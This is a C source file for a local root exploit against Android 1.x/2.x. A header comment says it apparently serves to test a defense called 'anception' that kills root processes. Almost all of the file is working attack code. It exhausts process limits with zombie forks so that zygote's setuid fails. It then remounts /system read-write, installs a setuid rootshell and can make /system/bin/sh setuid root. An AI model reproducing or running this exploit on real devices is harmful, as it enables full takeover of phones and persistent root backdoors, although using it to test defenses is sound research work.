/* Android 1.x/2.x zygote exploit (C) 2009-2010 The Android Exploid Crew */
/*
   since the app is forking in the host, zygote will eventually launch
   a root process on the host.
   This achieves root on the host kernel. If it invokes any system call
   anception will notice that a root process is communicating with it.
   Anception maintains an invariant that no root process should ever
   be bound. The moment the root malware invokes any syscall, it will be killed
   and the event will be logged
   */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/types.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/mount.h>

extern char **environ;

void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


int copy(const char *from, const char *to)
{
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0)
		return -1;
	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf));
		if (r <= 0)
			break;
		if (write(fd2, buf, r) != r)
			break;
	}

	close(fd1);
	close(fd2);
	sync(); sync();
	return r;
}


void rootshell(char **env)
{
	char *sh[] = {"/system/bin/sh", 0};

	// AID_SHELL
	if (getuid() != 2000)
		die("[-] Permission denied.");

	setuid(0); setgid(0);
	execve(*sh, sh, env);
	die("[-] execve");
}


int remount_system(const char *mntpoint)
{
	FILE *f = NULL;
	int found = 0;
	char buf[1024], *dev = NULL, *fstype = NULL;

	if ((f = fopen("/proc/mounts", "r")) == NULL)
		return -1;

	memset(buf, 0, sizeof(buf));
	for (;!feof(f);) {
		if (fgets(buf, sizeof(buf), f) == NULL)
			break;
		if (strstr(buf, mntpoint)) {
			found = 1;
			break;
		}
	}
	fclose(f);
	if (!found)
		return -1;
	if ((dev = strtok(buf, " \t")) == NULL)
		return -1;
	if (strtok(NULL, " \t") == NULL)
		return -1;
	if ((fstype = strtok(NULL, " \t")) == NULL)
		return -1;
	return mount(dev, mntpoint, fstype, MS_REMOUNT, 0);
}


void root()
{
	int i = 0, me = getpid(), fd = -1;
	char buf[256];

	for (i = 0; i < me; ++i) {
		snprintf(buf, sizeof(buf), "/proc/%d/status", i);
		if ((fd = open(buf, O_RDONLY)) < 0)
			continue;
		memset(buf, 0, sizeof(buf));
		if (read(fd, buf, 42) < 0)
			continue;
		if (strstr(buf, "libjailbreak.so"))
			kill(i, SIGKILL);
		close(fd);
	}

	remount_system("/system");
	if (copy("/proc/self/exe", "/system/bin/rootshell") != 0)
		chmod("/system/bin/sh", 04755);
	else
		chmod("/system/bin/rootshell", 04711);
	exit(0);
}


int main()
{
	pid_t p;

	if (getuid() && geteuid() == 0)
		rootshell(environ);
	else if (geteuid() == 0)
		root();

	if (fork() > 0) {
		exit(0);
	}

	setsid();

	/* Create a bunch of zombies, making zygote's
	 * setuid() fail (emulator ulimit was 768).
	 * Wrong java code logs error but continues.
	 */
	for (;;) {
		if ((p = fork()) == 0) {
			exit(1);
		} else if (p < 0) {
			sleep(3);
		} else {
			;
		}
	}
	return 0;
}

